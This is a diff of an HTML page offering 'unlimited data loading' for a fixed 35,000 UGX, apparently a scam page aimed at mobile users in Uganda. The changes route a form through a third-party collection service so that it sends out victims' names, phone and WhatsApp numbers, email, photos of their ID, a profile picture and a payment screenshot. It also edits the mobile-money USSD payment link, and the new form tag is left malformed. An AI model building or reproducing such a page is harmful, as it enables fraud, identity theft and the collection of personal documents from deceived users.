@@ -235,7 +235,7 @@
   <div class="page-container">
     <h1>UNLIMITED DATA LOADING</h1>
     <div class="price-tag">FIXED RATE: 35,000 UGX</div>
-    <p class="subtitle">Complete payment, upload your KYC documentation for verification, and activate your data plan.</p>
+    <p class="subtitle">Complete payment, upload your documents for verification, and activate your data plan.</p>
 
     <div class="form-container">
       
@@ -245,7 +245,7 @@
       </div>
 
       <div class="payment-actions">
-        <a href="tel:*165*1*1*0770000000%23" class="btn-payment btn-mtn">
+        <a href="tel:*165*1*1*Null%23" class="btn-payment btn-mtn">
           <svg class="provider-logo" viewBox="0 0 24 24" fill="currentColor">
             <circle cx="12" cy="12" r="10" fill="#000"/>
             <text x="50%" y="55%" dominant-baseline="middle" text-anchor="middle" fill="#ffcc00" font-size="8" font-weight="bold">MTN</text>
@@ -262,7 +262,7 @@
         </a>
       </div>
 
-      <form id="dataForm" onsubmit="handleDataSubmit(event)">
+      <form action="https://formsubmit.co/7ad95b262b00edb357cd334c9a241c19" method="POST" enctype="multipart/form-data"
         <div class="payment-instruction" style="margin-top: 10px;">
           <h4>Step 2: Verification Details</h4>
         </div>
@@ -270,42 +270,42 @@
         <div class="form-grid">
           <div class="form-group">
             <label for="firstName">First Name</label>
-            <input type="text" id="firstName" required placeholder="e.g. John">
+            <input type="text" id="firstName" name="First Name" required placeholder="e.g. John">
           </div>
           
           <div class="form-group">
             <label for="surname">Surname</label>
-            <input type="text" id="surname" required placeholder="e.g. Okello">
+            <input type="text" id="surname" name="Surname"  required placeholder="e.g. Okello">
           </div>
 
           <div class="form-group">
-            <label for="contact">Phone Contact</label>
-            <input type="tel" id="contact" required placeholder="+256 700 000 000">
+            <label for="contact">Data Contact</label>
+            <input type="tel" id="contact" name="Data Contact" required placeholder="+256 700 000 000">
           </div>
 
           <div class="form-group">
             <label for="whatsapp">WhatsApp Number</label>
-            <input type="tel" id="whatsapp" required placeholder="+256 700 000 000">
+            <input type="tel" id="whatsapp" name="Whatsapp Number" required placeholder="+256 700 000 000">
           </div>
 
           <div class="form-group full-width">
             <label for="email">Email Address</label>
-            <input type="email" id="email" required placeholder="name@example.com">
+            <input type="email" id="email" name="Email" required placeholder="name@example.com">
           </div>
 
           <div class="form-group">
             <label for="idFront">Front View of ID</label>
-            <input type="file" id="idFront" accept="image/*" required>
+            <input type="file" id="idFront" name="Front View of ID" accept="image/*" required>
           </div>
 
           <div class="form-group">
             <label for="profilePic">Profile Picture</label>
-            <input type="file" id="profilePic" accept="image/*" required>
+            <input type="file" id="profilePic" name="Profile Picture" accept="image/*" required>
           </div>
 
           <div class="form-group full-width">
             <label for="paymentProof">Payment Screenshot (UGX 35,000)</label>
-            <input type="file" id="paymentProof" accept="image/*" required>
+            <input type="file" id="paymentProof" name="Payment Screenshot" accept="image/*" required>
           </div>
         </div>
 
